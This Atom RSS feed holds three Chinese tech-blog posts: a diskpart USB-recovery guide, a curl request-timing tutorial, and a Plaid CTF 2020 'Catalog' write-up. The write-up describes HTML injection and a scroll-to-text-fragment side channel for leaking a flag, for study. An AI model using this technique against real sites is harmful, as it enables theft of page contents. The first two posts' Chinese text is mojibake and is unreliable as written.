<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <generator>NUAA</generator>
    <id>https://blogroll.a2os.club</id>
    <title>NUAARSS</title>
    <updated>2020-05-18T00:08:55+08:00</updated>
    <link href="https://blogroll.a2os.club"/>
    <author>
        <name>NUAARSS</name>
    </author>
    
    
    <entry>
        <id>https://blog.triplez.cn/u-disk-4mb-recovery/</id>
        <title><![CDATA[Uç›˜å†™å…¥ç³»ç»Ÿåå˜ä¸º4MBçš„è¿˜åŸæ–¹æ³•]]></title>
        <updated>2020-05-16T09:52:48+08:00</updated>
        <link href="https://blog.triplez.cn/u-disk-4mb-recovery/"/>
        <content type="text/html" src="https://blog.triplez.cn/u-disk-4mb-recovery/"><![CDATA[<p>åœ¨ <code>cmd</code> ä¸­æˆ– <code>powershell</code> ä¸­è¾“å…¥ <code>diskpart</code> å‘½ä»¤ï¼Œè¿›å…¥ <code>diskpart</code> ç¨‹åºã€‚</p>
<ol start="1.">
<li>è¾“å…¥ <code>list disk</code> æŸ¥çœ‹ç£ç›˜åˆ—è¡¨<br />
<img src="https://triplez-public-1251926021.cos.ap-shanghai.myqcloud.com/11.7.2019_U%E7%9B%98%E5%9B%A0%E4%B8%BA%E5%86%99%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%8F%98%E4%B8%BA4MB%E7%9A%84%E8%BF%98%E5%8E%9F%E6%96%B9%E6%B3%95/image-20191107223340468.png" alt="image-20191107223340468" /></p>
</li>
<li>
<p>è¾“å…¥ <code>select disk 2</code> ä»¥é€‰æ‹©ç›®æ ‡ U ç›˜ï¼ˆè¦æ ¹æ®è‡ªå·± U ç›˜çš„æ•°å­—æ ‡è¯†æ¥é€‰æ‹©ï¼‰ã€‚<br />
<img src="https://triplez-public-1251926021.cos.ap-shanghai.myqcloud.com/11.7.2019_U%E7%9B%98%E5%9B%A0%E4%B8%BA%E5%86%99%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%8F%98%E4%B8%BA4MB%E7%9A%84%E8%BF%98%E5%8E%9F%E6%96%B9%E6%B3%95/image-20191107223559778.png" alt="image-20191107223559778" /></p>
</li>
<li>è¾“å…¥ <code>clean</code> æ¸…é™¤æ•´ä¸ª U ç›˜ã€‚<img src="https://triplez-public-1251926021.cos.ap-shanghai.myqcloud.com/11.7.2019_U%E7%9B%98%E5%9B%A0%E4%B8%BA%E5%86%99%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%8F%98%E4%B8%BA4MB%E7%9A%84%E8%BF%98%E5%8E%9F%E6%96%B9%E6%B3%95/image-20191107223817331.png" alt="image-20191107223817331" /></li>
<li>æ­¤æ—¶ U ç›˜æ˜¯ç©ºä½†æœªåˆ†åŒºçŠ¶æ€ï¼Œä½¿ç”¨ <code>create partition primary</code> å‘½ä»¤æ¥å»ºç«‹é»˜è®¤åˆ†åŒºï¼š<br />
<img src="https://triplez-public-1251926021.cos.ap-shanghai.myqcloud.com/11.7.2019_U%E7%9B%98%E5%9B%A0%E4%B8%BA%E5%86%99%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%8F%98%E4%B8%BA4MB%E7%9A%84%E8%BF%98%E5%8E%9F%E6%96%B9%E6%B3%95/image-20191107223945186.png" alt="image-20191107223945186" /></li>
</ol start="1.">
<p>è¿™æ ·è¿™ä¸ªè¿‡ç¨‹å°±ç»“æŸäº†ï¼Œæ­å–œä½ æˆåŠŸæ•‘å›äº†ä½ çš„ U ç›˜ :smile::tada:</p>
<p>The post <a rel="nofollow" href="https://blog.triplez.cn/u-disk-4mb-recovery/">Uç›˜å†™å…¥ç³»ç»Ÿåå˜ä¸º4MBçš„è¿˜åŸæ–¹æ³•</a> appeared first on <a rel="nofollow" href="https://blog.triplez.cn">Blog</a>.</p>]]></content>
        <author>
            <name><![CDATA[TripleZâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/using-curl-analyzing-time-cost-at-request-diff-phases/</id>
        <title><![CDATA[ä½¿ç”¨ curl æ¥åˆ†æè¯·æ±‚å„ä¸ªé˜¶æ®µçš„è€—æ—¶]]></title>
        <updated>2020-05-11T15:35:41+08:00</updated>
        <link href="https://blog.triplez.cn/using-curl-analyzing-time-cost-at-request-diff-phases/"/>
        <content type="text/html" src="https://blog.triplez.cn/using-curl-analyzing-time-cost-at-request-diff-phases/"><![CDATA[<h2>How</h2>
<p>è¿™ä¸ªåŠŸèƒ½ç”¨åˆ°çš„æ˜¯ <code>curl</code> çš„ <code>-w</code> é€‰é¡¹ï¼Œè®©æˆ‘ä»¬æ¥å…ˆçœ‹çœ‹ <code>curl</code> çš„ man pageï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-null">-w, --write-out &lt;format&gt;
       Make curl display information on stdout after a completed transfer. The format is  a  string  that  may  contain lain  text  mixed  with  any number of variables. The format can be specified as a literal "string", or you can have curl read the format from a file with "@filename" and to tell curl to read the format from stdin you  write "@-".

       The variables present in the output format will be substituted by the value or text that curl thinks fit, as deâ€ scribed below. All variables are specified as %{variable_name} and to output a normal % you just write  them  as %%. You can output a newline by using \n, a carriage return with \r and a tab space with \t.

       The output will be written to standard output, but this can be switched to standard error by using %{stderr}.ä½¿ç”¨ curl å‘½ä»¤åˆ†æè¯·æ±‚çš„è€—æ—¶æƒ…å†µ
</code></pre>
<p>ä¸‹é¢çš„å†…å®¹å°±æ˜¯å„ç§å†…ç½®å˜é‡äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™äº›å˜é‡çš„å€¼æ¥ä¸€çª¥è¯·æ±‚çš„çœŸå®ä¿¡æ¯ã€‚</p>
<p>ä»¥ä¸‹æœ‰ä¸€ä¸ªâ€œå¹¿ä¸ºæµä¼ â€çš„æ ¼å¼ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-null">    time_namelookup:  %{time_namelookup}\n
       time_connect:  %{time_connect}\n
    time_appconnect:  %{time_appconnect}\n
      time_redirect:  %{time_redirect}\n
   time_pretransfer:  %{time_pretransfer}\n
 time_starttransfer:  %{time_starttransfer}\n
                    ----------\n
         time_total:  %{time_total}\n
</code></pre>
<p>å°†å¦‚ä¸Šå†…å®¹å†™è‡³ <code>curl-format</code> æ–‡ä»¶ä¸­ï¼Œç„¶ååœ¨å½“å‰ç›®å½•è¿è¡Œï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ curl -w @curl-format -o /dev/null -s -L http://triplez.cn
</code></pre>
<blockquote>
<ul>
<li><code>-w @curl-format</code> ï¼šä½¿ç”¨ <code>curl-format</code> æ–‡ä»¶æ¨¡æ¿è¿›è¡Œè¾“å‡ºã€‚</p>
</li>
<li>
<p><code>-o /dev/null</code> ï¼šå¿½ç•¥è¾“å‡ºå†…å®¹ã€‚</p>
</li>
<li>
<p><code>-s</code> ï¼šä¸è¾“å‡ºå¤šä½™ä¿¡æ¯ã€‚</p>
</li>
<li><code>-L</code> ï¼šæ”¯æŒè·³è½¬ï¼ˆå¦‚ HTTP è·³è½¬è‡³ HTTPSï¼‰ã€‚</li>
</ul>
</blockquote>
<p>å°±ä¼šçœ‹åˆ°åƒè¿™æ ·çš„è¾“å‡ºï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-null">    time_namelookup:  0.001931
       time_connect:  0.032337
    time_appconnect:  0.120072
      time_redirect:  0.000000
   time_pretransfer:  0.120124
 time_starttransfer:  0.151386
                    ----------
         time_total:  0.152068
</code></pre>
<p>è¿™äº›å˜é‡çš„æ„ä¹‰æ˜¯ï¼š</p>
<ul>
<li><code>time_namelookup</code>ï¼šDNS åŸŸåè§£æçš„è€—æ—¶ã€‚</li>
<li><code>time_connect</code>ï¼šTCP è¿æ¥å»ºç«‹è€—æ—¶ã€‚</li>
<li><code>time_appconnect</code>ï¼šSSL/SSH ç­‰ä¸Šå±‚åè®®å»ºç«‹è¿æ¥çš„è€—æ—¶ï¼Œæ¯”å¦‚ connect/handshake è€—æ—¶ï¼ˆä»æ­¤å¤„ä¹Ÿå¯çœ‹å‡ºï¼Œæœ€åè¿˜æ˜¯è¯·æ±‚äº† <code>https://triplez.cn</code> ï¼Œå¦åˆ™ HTTP ä¸ä¼šäº§ç”Ÿ <code>time_appconnect</code> çš„è€—æ—¶ã€‚</li>
<li><code>time_redirect</code>ï¼šä»å¼€å§‹åˆ°æœ€åä¸€ä¸ªè¯·æ±‚äº‹åŠ¡çš„è€—æ—¶ã€‚</li>
<li><code>time_pretransfer</code>ï¼šä»è¯·æ±‚å¼€å§‹åˆ°å“åº”å¼€å§‹ä¼ è¾“çš„è€—æ—¶ã€‚</li>
<li><code>time_starttransfer</code>ï¼šä»è¯·æ±‚å¼€å§‹åˆ°ç¬¬ä¸€ä¸ªå­—èŠ‚å°†è¦ä¼ è¾“çš„è€—æ—¶ã€‚</li>
<li><code>time_total</code>ï¼šè¿™æ¬¡è¯·æ±‚çš„æ€»è€—æ—¶ã€‚</li>
</ul>
<h2>One more thing...</h2>
<p><a href="https://github.com/reorx">reorx</a> å†™äº†ä¸ª Python çš„å°å·¥å…· <a href="https://github.com/reorx/httpstat">httpstat</a>ï¼Œè®©å‘½ä»¤è¡Œåˆ†æè¯·æ±‚è€—æ—¶æ›´åŠ ç›´è§‚ã€‚é€šè¿‡ä»¥ä¸‹å‘½ä»¤å³å¯å®‰è£…ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ pip install httpstat
</code></pre>
<p>è®©æˆ‘ä»¬æ¥è¯•ä¸€ä¸‹ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ httpstat -L http://triplez.cn
Connected to 123.206.208.167:443 from 192.168.0.10:34372

HTTP/1.1 302 Found
Date: Mon, 11 May 2020 15:24:00 GMT
Server: Apache
Location: https://triplez.cn/
Content-Length: 203
Content-Type: text/html; charset=iso-8859-1

HTTP/1.1 200 OK
Date: Mon, 11 May 2020 15:24:00 GMT
Server: Apache
Last-Modified: Sun, 08 Mar 2020 07:48:35 GMT
ETag: "7258f-f13-5a0531d213ac0"
Accept-Ranges: bytes
Content-Length: 3859
Content-Type: text/html; charset=UTF-8

Body stored in: /tmp/tmpkeq3ospo

  DNS Lookup   TCP Connection   Server Processing   Content Transfer
[    32ms    |      66ms      |       73ms        |        1ms       ]
             |                |                   |                  |
    namelookup:32ms           |                   |                  |
                        connect:98ms              |                  |
                                      starttransfer:266ms            |
                                                                 total:267ms  
</code></pre>
<p>ä»è¾“å‡ºä¸Šæˆ‘ä»¬å°±å¯ä»¥å¾ˆç›´è§‚åœ°çœ‹å‡ºæ¥ï¼Œä» <code>http://triplez.cn</code> åˆ° <code>https://triplez.cn</code> ä¸­å®Œæˆäº†ä¸€æ¬¡ 302 è·³è½¬ï¼Œåœ¨è¾“å‡ºæœ«å°¾çš„ç¤ºæ„å›¾ä¸Šæˆ‘ä»¬ä¹Ÿå¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ°å„é˜¶æ®µçš„è€—æ—¶ã€‚</p>
<p>Happy hacking ğŸ˜›</p>
<h2>References</h2>
<ul>
<li><a href="https://cizixs.com/2017/04/11/use-curl-to-analyze-request/">ä½¿ç”¨ curl å‘½ä»¤åˆ†æè¯·æ±‚çš„è€—æ—¶æƒ…å†µ</a></li>
</ul>
<p>The post <a rel="nofollow" href="https://blog.triplez.cn/using-curl-analyzing-time-cost-at-request-diff-phases/">ä½¿ç”¨ curl æ¥åˆ†æè¯·æ±‚å„ä¸ªé˜¶æ®µçš„è€—æ—¶</a> appeared first on <a rel="nofollow" href="https://blog.triplez.cn">Blog</a>.</p>]]></content>
        <author>
            <name><![CDATA[TripleZâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/04/24/Plaid-CTF-2020-Web-2/</id>
        <title><![CDATA[Plaid CTF 2020 Catalog]]></title>
        <updated>2020-05-05T17:31:59+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/04/24/Plaid-CTF-2020-Web-2/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/04/24/Plaid-CTF-2020-Web-2/"><![CDATA[<html><head></head><body><p>&#x672C;&#x6587;&#x662F;&#x5173;&#x4E8E; Plaid CTF 2020 Catalog &#x9898;&#x76EE;&#x7684;&#x4E00;&#x4E9B;&#x590D;&#x76D8;&#x4E0E;&#x63A2;&#x7A76;&#x3002;</p><a id="more"></a><p>&#x8FD9;&#x9053;&#x9898;&#x662F;&#x672C;&#x6B21; PlaidCTF &#x5168;&#x573A;&#x552F;&#x4E00;&#x4E00;&#x9053;0&#x89E3;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x53EF;&#x4EE5;&#x8BF4;&#x662F;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x96BE;&#x5EA6;&#x7684;&#xFF0C;&#x4E5F;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#x3002;&#x8FD9;&#x91CC;&#x975E;&#x5E38;&#x611F;&#x8C22; @wupco @rebirthwyw @bks25wzsx&#xFF08;&#x4F17;&#x6240;&#x5468;&#x77E5;&#xFF0C;@zsx &#x53C8;&#x540D; @bks25wzsx&#xFF09;&#x5E08;&#x5085;&#x4EEC;&#x7684;&#x6307;&#x70B9;&#xFF0C;&#x590D;&#x76D8;&#x7684;&#x65F6;&#x5019;&#x6BD4;&#x8F83;&#x8270;&#x96BE;&#xFF0C;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x6211;&#x4F1A;&#x5C3D;&#x91CF;&#x7528;&#x81EA;&#x5DF1;&#x8FD8;&#x7B97;&#x6BD4;&#x8F83;&#x6E05;&#x6670;&#x7684;&#x903B;&#x8F91;&#x8BB2;&#x4E00;&#x4E0B;&#x672C;&#x9053;&#x9898;&#xFF0C;&#x5982;&#x679C;&#x54EA;&#x91CC;&#x6709;&#x51FA;&#x9519;&#x7684;&#x8FD8;&#x8BF7;&#x5E08;&#x5085;&#x4EEC;&#x591A;&#x591A;&#x5305;&#x6DB5;&#x3002;</p><p>&#x7531;&#x4E8E;&#x8FD9;&#x4E2A;&#x9898;&#x662F;&#x590D;&#x76D8;&#x9898;&#xFF0C;&#x6240;&#x4EE5;&#x505A;&#x9898;&#x601D;&#x8DEF;&#x53EF;&#x80FD;&#x4F1A;&#x5C11;&#x4E00;&#x4E9B;&#xFF0C;&#x66F4;&#x591A;&#x7684;&#x662F;&#x5BF9;&#x4E8E;&#x51FA;&#x9898;&#x70B9;&#x4EE5;&#x53CA;exp&#x4E00;&#x4E9B;&#x5206;&#x6790;&#x4EC0;&#x4E48;&#x7684;&#x3002;</p><blockquote class="colorquote danger"><p>5&#x6708;6&#x65E5;&#x66F4;&#x65B0;&#xFF1A;&#x4F5C;&#x8005;&#x5DF2;&#x7ECF;&#x653E;&#x51FA;&#x4E86;&#x4ED6;&#x7684; Write Up&#x2014;&#x2014;<a href="https://dttw.tech/posts/B19RXWzYL" target="_blank" rel="noopener">PlaidCTF 2020: Catalog Writeup</a> &#xFF0C;&#x9898;&#x76EE;&#x4ED3;&#x5E93;&#x2014;&#x2014; <a href="https://github.com/bluepichu/ctf-challenges/tree/master/plaidctf-2020/catalog" target="_blank" rel="noopener">catalog</a> &#xFF0C;&#x6587;&#x4E2D;&#x5185;&#x5BB9;&#x53EF;&#x80FD;&#x4E0E;&#x4F5C;&#x8005; Write Up &#x6709;&#x4E9B;&#x8BB8;&#x51FA;&#x5165;&#xFF0C;&#x8BF7;&#x4EE5;&#x4F5C;&#x8005;&#x7684; Write Up &#x4E3A;&#x51C6;&#xFF01;&#x672C;&#x6587;&#x6682;&#x672A;&#x66F4;&#x65B0;&#xFF01;</p></blockquote><h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><blockquote><p><a href="http://catalog.pwni.ng/" target="_blank" rel="noopener">Here&#x2019;s the site</a>. The flag is on <a href="http://catalog.pwni.ng/issue.php?id=3" target="_blank" rel="noopener">this page</a>.</p><p>Browser: Chromium <strong>with uBlock Origin 1.26.0 installed and in its default configuration</strong></p><p>Flag format: <code>/^PCTF\{[A-Z0-9_]+\}$/</code></p><p><strong>Hints</strong>:</p><ul><li>To view your post, the admin will click on a link on the admin page.</li><li>You might want to read up on User Activation.</li><li>The intended solution does not require you to submit hundreds of captchas.</li></ul><p>Hint: Admin Bot Timeout</p><p>The admin bot will always disconnect after about 30 seconds.    </p></blockquote><p>&#x7ED9;&#x6CA1;&#x6709;&#x770B;&#x9898;&#x7684;&#x5C0F;&#x4F19;&#x4F34;&#x7B80;&#x7565;&#x5730;&#x6982;&#x62EC;&#x4E00;&#x4E0B;&#x9898;&#x76EE;&#xFF0C;&#x9898;&#x76EE;&#x662F;&#x4E2A;&#x9ED1;&#x76D2;&#xFF0C;&#x6709;&#x767B;&#x5F55;&#x6CE8;&#x518C;&#x3001;&#x53D1;&#x8868; issue &#x3001;&#x63D0;&#x4EA4; issue &#x7ED9; admin &#x770B;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x8FD9;&#x4E9B;&#x529F;&#x80FD;&#xFF0C;&#x5F88;&#x660E;&#x663E;&#x9898;&#x76EE;&#x9700;&#x8981;&#x6211;&#x4EEC;&#x8FDB;&#x884C; XSS</p><p>&#x5176;&#x4E2D;&#x6709;&#x51E0;&#x4E2A;&#x7EC6;&#x8282;&#x6F0F;&#x6D1E;&#xFF1A;</p><ol><li><p>&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x76F4;&#x63A5;&#x65E0;&#x8FC7;&#x6EE4;&#x5730;&#x56DE;&#x663E;&#x7528;&#x6237;&#x540D;&#xFF0C;&#x8FD9;&#x91CC;&#x6709;&#x4E00;&#x5904; HTML &#x6CE8;&#x5165;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200423014836.png" alt></p></li><li><p>&#x5728;&#x63D0;&#x4EA4; issue &#x5904;&#xFF0C;&#x6709;&#x4E00;&#x9879;&#x9700;&#x8981;&#x63D0;&#x4EA4; image URL &#x7684;&#x5730;&#x65B9;&#x4E5F;&#x5B58;&#x5728;&#x7740; HTML &#x6CE8;&#x5165;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200423021048.png" alt></p></li><li><p>&#x9898;&#x76EE;&#x8BBE;&#x7F6E;&#x8FD8;&#x4F1A;&#x5229;&#x7528; session &#x6765;&#x5B58;&#x50A8;&#x4E00;&#x4E9B; HTML &#x5143;&#x7D20;&#xFF0C;&#x4F8B;&#x5982;&#x6211;&#x4EEC;&#x5728;&#x540C;&#x4E00;&#x4E2A; session &#x5148;&#x767B;&#x5F55;&#xFF0C;&#x518D;&#x7528;&#x8FD9;&#x4E2A; session &#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x5237;&#x65B0;&#x6211;&#x4EEC;&#x5DF2;&#x767B;&#x5F55;&#x7684;&#x9875;&#x9762;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF1A;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200424222148.png" alt></p></li></ol><h3 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h3><p></p><figure class="highlight csp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">Content-Security-Policy</span>: <span class="hljs-keyword">default-src</span> <span class="hljs-string">&apos;nonce-xhncdWd319Yj3acHJbKoEWmK8stBxy88&apos;</span>; <span class="hljs-keyword">img-src</span> *; <span class="hljs-keyword">font-src</span> <span class="hljs-string">&apos;self&apos;</span> fonts.gstatic.com; <span class="hljs-keyword">frame-src</span> https://www.google.com/recaptcha/</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x9898;&#x76EE;&#x7ED9;&#x7684; CSP &#x662F;&#x8FD9;&#x4E9B;&#xFF0C;&#x8FD9;&#x4E9B; CSP &#x9650;&#x5236;&#x4E86;&#x6211;&#x4EEC;&#x63D2;&#x5165;&#x7684;&#x4EE3;&#x7801;&#x6267;&#x884C;&#xFF0C;&#x4F46;&#x662F;&#x4E5F;&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x8FD9;&#x91CC;&#x5E76;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E; base-uri &#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8BD5;&#x56FE;&#x5229;&#x7528; HTML &#x6CE8;&#x5165;&#x70B9;&#xFF0C;&#x5229;&#x7528;<code>&lt;base&gt;</code>&#x6765;&#x8FDB;&#x884C; XSS &#xFF0C;&#x4F46;&#x662F;&#x5E76;&#x4E0D;&#x50CF; RCTF 2018 rblog &#x90A3;&#x9053;&#x9898;&#xFF0C;&#x8FD9;&#x9053;&#x9898;&#x7684;&#x63D2;&#x5165;&#x70B9;&#x5728;&#x6BD4;&#x8F83;&#x9760;&#x540E;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x63A7;&#x5236;&#x4E4B;&#x524D;&#x5F15;&#x5165;&#x6587;&#x4EF6;&#x7684; url &#xFF0C;&#x6240;&#x4EE5;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x5229;&#x7528; base uri &#x7684;&#x601D;&#x8DEF;&#x6765;&#x8FDB;&#x884C; XSS </p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><blockquote><p>Catalog has two injections: the image tag on the issue page and the username when you fail to login.  Use the image tag one with a meta redirect to get offsite.  Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation.  Whenever a page loads, the frontend gets a postMessage from the uBlock frame, and thus duplicates the activation back again.  Now make a no-cors POST to use the failed login injection, then send them to issue.php?id=3.  So now we have arbitrary content with a user activation on the correct page, but still no code exec.  (&#x2026;the rest of the exploit to come in a moment&#x2026;)</p><p>(&#x2026;continuation of previous post&#x2026;) Ok, but what can we do?  A recent addition to Chromium was scroll-to-text-fragment, which lets you search the page for text (in entire words only) and scroll to it, <em>though this consumes the user activation</em>.  If you could search for a letter at a time, then you could use your injection to add a bunch of whitespace and a lazy-loading image to detect the scroll.It turns out you can: the whole-word match counts tag boundaries as word boundaries, and the <code>&lt;em&gt;</code> tag gets split into a <code>&lt;span&gt;</code> for each individual letter on load!  So you can do text searches of the form <code>#:~:text=F-,{,-X</code> for example to search for an X at the beginning of the flag.  You can specify multiple text searches to do a binary search across the whole alphabet.  Also include a meta refresh to send back offsite again after a short delay and you can leak ~5 characters per captcha.  Repeat 5 or 6 times to get the whole flag.</p></blockquote><p>&#x8FD9;&#x4E00;&#x6BB5;&#x662F;&#x8D5B;&#x540E; @bluepichu &#x5728; irc &#x4E0A;&#x8BF4;&#x7684;&#x4E00;&#x6BB5;&#x8BDD;&#xFF0C;&#x4E5F;&#x7B97;&#x662F;&#x5BF9; catalog &#x8FD9;&#x9053;&#x9898;&#x76EE;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x4E5F;&#x7B97;&#x662F;&#x7B80;&#x77ED;&#x7684; wp &#x3002;</p><p>&#x540C;&#x65F6;&#xFF0C;@lbherrera_ &#x5728;&#x8D5B;&#x540E;&#x53D1;&#x4E86;&#x4E00;&#x4E2A;&#x63A8;&#x7279;&#x516C;&#x5F00;&#x4E86;&#x4ED6;&#x4E00;&#x90E8;&#x5206;&#x672C;&#x9898;&#x7684; exp :</p><div class="twitter-wrapper"><blockquote class="twitter-tweet"><a href="https://twitter.com/lbherrera_/status/1251994130298875904" target="_blank" rel="noopener"></a></blockquote></div><script async defer src="//platform.twitter.com/widgets.js" charset="utf-8"></script><p>Exp &#x5730;&#x5740;&#x5728;: <a href="https://gist.github.com/lbherrera/2057d53e7571cde12781758da108a76b" target="_blank" rel="noopener">https://gist.github.com/lbherrera/2057d53e7571cde12781758da108a76b</a></p><p>&#x4F46;&#x662F;&#x6BD4;&#x8F83;&#x9057;&#x61BE;&#x7684;&#x662F;&#xFF0C;&#x8BE5;&#x4F5C;&#x8005;&#x5230;&#x76EE;&#x524D;&#x4E3A;&#x6B62;&#x8FD8;&#x5E76;&#x672A;&#x53D1;&#x5E03;&#x4ED6;&#x81EA;&#x5DF1;&#x7684; write up &#xFF0C;&#x5982;&#x679C;&#x5927;&#x5BB6;&#x80FD;&#x770B;&#x61C2;&#x8FD9;&#x4E9B;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x9898;&#x540E;&#x9762;&#x7684;&#x90E8;&#x5206;&#x5927;&#x5BB6;&#x5C31;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8DF3;&#x8FC7;&#x4E86;&#xFF0C;&#x540E;&#x6587;&#x4E5F;&#x5C31;&#x662F;&#x57FA;&#x672C;&#x6309;&#x7167;&#x8FD9;&#x4E2A;&#x5927;&#x81F4;&#x7684;&#x601D;&#x8DEF;&#x6765;&#x5206;&#x6790;&#x8FD9;&#x4E2A;&#x9898;&#x7684;&#x3002;    </p><h3 id="User-Activation"><a href="#User-Activation" class="headerlink" title="User Activation"></a>User Activation</h3><p><strong>&#x8FD9;&#x90E8;&#x5206;&#x7531;&#x4E8E;&#x81EA;&#x5DF1;&#x7684;&#x7406;&#x89E3;&#x4E5F;&#x4E0D;&#x662F;&#x7279;&#x522B;&#x6DF1;&#x523B;&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x662F;&#x6BD4;&#x8F83;&#x7C97;&#x6D45;&#x7684;&#x4E2A;&#x4EBA;&#x7406;&#x89E3;&#xFF0C;&#x5982;&#x6709;&#x9519;&#x8BEF;&#xFF0C;&#x8FD8;&#x8BF7;&#x5E08;&#x5085;&#x76F4;&#x63A5;&#x6307;&#x51FA;&#x3002;</strong></p><p><strong>&#x672C;&#x90E8;&#x5206;&#x53C2;&#x8003;&#x4E3B;&#x8981;&#x662F;&#x4E24;&#x4E2A;&#x6587;&#x6863;&#xFF1A;<a href="https://www.chromestatus.com/feature/5722065667620864" target="_blank" rel="noopener">User Activation v2</a>&#x3001;<a href="https://mustaqahmed.github.io/user-activation-v2/" target="_blank" rel="noopener">User Activation v2 (UAv2)</a>&#xFF0C;&#x5982;&#x679C;&#x5E08;&#x5085;&#x4EEC;&#x5BF9;&#x82F1;&#x6587;&#x9605;&#x8BFB;&#x7406;&#x89E3;&#x6BD4;&#x8F83;&#x597D;&#xFF0C;&#x66F4;&#x5EFA;&#x8BAE;&#x770B;&#x539F;&#x6587;</strong></p><p>&#x2018;User Activation&#x2019; &#x8FD9;&#x4E2A;&#x8BCD;&#x770B;&#x8D77;&#x6765;&#x6BD4;&#x8F83;&#x7684;&#x5173;&#x952E;&#xFF0C;&#x51FA;&#x73B0;&#x5728;&#x4E86;&#x4F5C;&#x8005;&#x7684;&#x89E3;&#x91CA;&#x4EE5;&#x53CA; hint &#x5F53;&#x4E2D;&#xFF0C;&#x4F46;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x4F5C;&#x8005;&#x653E; hint &#x8981;&#x7279;&#x610F;&#x7ED9; &#x2018;User Activation&#x2019; &#x8FD9;&#x4E2A;&#x8BCD;&#x800C;&#x4E0D;&#x662F;&#x76F8;&#x5BF9;&#x4E8E;&#x66F4;&#x50CF;&#x901A;&#x4FD7;&#x7684; &#x2018;User Interaction&#x2019; &#x5462;&#xFF1F;</p><p>&#x968F;&#x4FBF;&#x641C;&#x4E00;&#x4E0B;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053; &#x2018;User Activation&#x2019; &#x5176;&#x5B9E;&#x7B97;&#x662F;&#x4E00;&#x4E2A;&#x672F;&#x8BED;&#xFF1A;</p><blockquote><p>&#x200B;    User activation is the mechanism to maintain active-user-interaction state that limits use of &#x201C;abusable&#x201D; APIs (e.g. opening popups or vibrating).</p></blockquote><p>&#x7B80;&#x800C;&#x8A00;&#x4E4B;&#xFF0C;User Activation(&#x6211;&#x4EEC;&#x6682;&#x4E14;&#x79F0;&#x4E3A;&#x201C;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x72B6;&#x6001;&#x201D;)&#xFF0C;&#x662F;&#x4E3A;&#x4E86;&#x4FDD;&#x6301;&#x7528;&#x6237;&#x4E3B;&#x52A8;&#x8FDB;&#x884C;&#x4EA4;&#x4E92;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x9650;&#x5236;&#x4E86;&#x4E00;&#x4E9B;&#x88AB;&#x6076;&#x610F;&#x4F7F;&#x7528;&#x7684; API &#xFF0C;&#x6BD4;&#x5982;&#x5F39;&#x7A97;&#x6216;&#x8005;&#x9707;&#x52A8;&#x3002;&#x201D;&#x6FC0;&#x6D3B; 